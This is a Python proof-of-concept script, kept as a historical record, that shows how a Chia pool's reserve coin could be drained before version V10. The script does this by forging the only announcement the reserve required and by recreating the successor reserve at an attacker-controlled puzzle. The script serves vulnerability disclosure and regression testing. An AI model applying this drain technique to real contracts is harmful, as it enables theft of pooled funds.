#!/usr/bin/env python3
"""HISTORICAL PoC: reserves were not bound to their pool before V10.

FIXED in V10 -- forge_reserve_FORGE now curries the launcher, asserts a PUZZLE
announcement against the owning pool's singleton puzzle hash, and pins its own
puzzle hash with AssertMyPuzzleHash. Against the current puzzle this script no
longer runs at all (the solution shape changed); it is kept as the record of
what V4..V9 allowed, and _test_forge_reserve_binding.py is the live regression.

The bug, as it stood through V9:

The reserve inner puzzle is never curried -- every pool of a given revision
shares one reserve puzzle, and the pool's identity arrives entirely in the
SOLUTION:

    fn main(launcher_id, asset_id, reserve_inner_puzzle_hash, plan)

`launcher_id` is asserted non-zero and then never used for anything. The only
authorization the reserve requires is:

    AssertCoinAnnouncement { id: sha256(plan.current_pool_coin_id + pool_message) }

and `plan.current_pool_coin_id` is chosen by whoever writes the solution. In Chia
that assertion is satisfied by ANY coin with that id announcing that message, so
the attacker picks a coin they already own, derives the message from their own
crafted plan, and spends it emitting the announcement. No pool singleton is
involved at any point.

Worse, `reserve_inner_puzzle_hash` is also solution-supplied and is what the
successor reserve is recreated at, so the "successor" can be a puzzle the
attacker controls.

Net effect: anyone can spend any pool's reserve coin, leave a 1-mojo successor
at a puzzle of their choosing, and take the remainder through the settlement.
This affects every revision including the current FORGE set, and is independent
of the LP-authorization bug that produced V9.

Run against an archived pre-V10 reserve to reproduce.
"""
import hashlib
import sys

sys.path.insert(0, ".")

from chia.types.blockchain_format.program import Program
from chia.wallet.cat_wallet.cat_utils import CAT_MOD, construct_cat_puzzle
from chia.wallet.trading.offer import OFFER_MOD
from chia_rs.sized_bytes import bytes32

from forge_offer import ZERO_32, compiled_program

CAT_ASSET = bytes32(bytes.fromhex("a1" * 32))


def amt(n: int) -> bytes:
    return b"" if n == 0 else n.to_bytes((n.bit_length() + 8) // 8, "big")


def coin_id(parent: bytes32, ph: bytes32, a: int) -> bytes32:
    return bytes32(hashlib.sha256(bytes(parent) + bytes(ph) + amt(a)).digest())


def tree_hash(v) -> bytes32:
    return Program.to(v).get_tree_hash()


def drain(asset_id: bytes32, label: str) -> bool:
    reserve = compiled_program("forge_reserve_FORGE")
    victim = bytes32(b"\x77" * 32)
    current, successor = 10_000_000_000_000, 1
    released = current - successor

    attacker_launcher = bytes32(b"\xAA" * 32)
    attacker_pool_coin = bytes32(b"\xBB" * 32)   # any coin the attacker can spend
    attacker_reserve_ph = bytes32(b"\xCC" * 32)  # a puzzle the attacker controls

    is_native = asset_id == ZERO_32
    succ_ph = (attacker_reserve_ph if is_native else
               construct_cat_puzzle(CAT_MOD, asset_id, Program.to(attacker_reserve_ph))
               .get_tree_hash_precalc(attacker_reserve_ph))
    settle_ph = (bytes32(OFFER_MOD.get_tree_hash()) if is_native else
                 construct_cat_puzzle(CAT_MOD, asset_id, OFFER_MOD).get_tree_hash())

    plan = [0, attacker_pool_coin, asset_id, victim, current,
            coin_id(victim, settle_ph, released),
            coin_id(victim, succ_ph, successor), successor, 0, ZERO_32]

    try:
        out = reserve.run(Program.to([attacker_launcher, asset_id, attacker_reserve_ph, plan]))
    except Exception as exc:
        print(f"  [{label}] reserve REFUSED: {type(exc).__name__}: {str(exc)[:60]}")
        return False

    payouts = []
    announcement = None
    for cond in out.as_iter():
        items = list(cond.as_iter())
        op = items[0].as_int()
        if op == 51:
            payouts.append((bytes(items[1].as_atom()).hex(), items[2].as_int()))
        elif op == 61:
            announcement = bytes(items[1].as_atom()).hex()

    print(f"  [{label}] reserve ACCEPTED an attacker-authored spend")
    for ph, a in payouts:
        who = "attacker's own puzzle" if ph.startswith("cccc") or ph.startswith(succ_ph.hex()[:8]) else "settlement (claimable by attacker)"
        print(f"           creates {a:>15}  at {ph[:20]}...  <- {who}")
    print(f"           only auth required: announcement {announcement[:20]}...")
    print(f"           from coin {attacker_pool_coin.hex()[:20]}... which the ATTACKER picks")
    return True


def main() -> int:
    print("Forge reserve puzzle:", compiled_program("forge_reserve_FORGE").get_tree_hash().hex())
    print("(identical for every pool -- nothing is curried)\n")

    native = drain(ZERO_32, "native TXCH")
    print()
    cat = drain(CAT_ASSET, "CAT reserve")

    print()
    if native or cat:
        print("VULNERABLE: reserve coins are not bound to their pool.")
        print("The pool singleton is never consulted; a coin the attacker already")
        print("owns supplies the only authorization the reserve asks for.")
        return 1
    print("Not reproducible against this build.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
